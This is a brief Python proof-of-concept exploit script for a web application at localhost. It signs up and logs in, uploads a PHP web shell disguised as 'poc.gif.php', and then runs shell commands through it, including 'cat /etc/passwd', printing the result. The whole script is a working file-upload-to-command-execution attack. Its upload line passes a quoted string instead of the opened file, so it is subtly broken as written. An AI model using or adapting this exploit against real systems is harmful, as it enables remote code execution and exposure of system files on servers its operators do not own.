import requests

data = {
    'username': 'admin',
    'password': '123'
}
file = {'file': 'open("poc.gif.php","rb")'}
r = requests.post(url= "http://localhost/?page=signup", data=data)
r = requests.post(url= "http://localhost/?page=login", data=data)

r = requests.post(url="http://localhost/?page=home",files=file)

r2 = requests.get(url="http://localhost/uploads/poc.gif.php?cmd=echo%20230502;cat%20/etc/passwd;echo%20230502")
res = r2.text.split('230502')
print(res[1])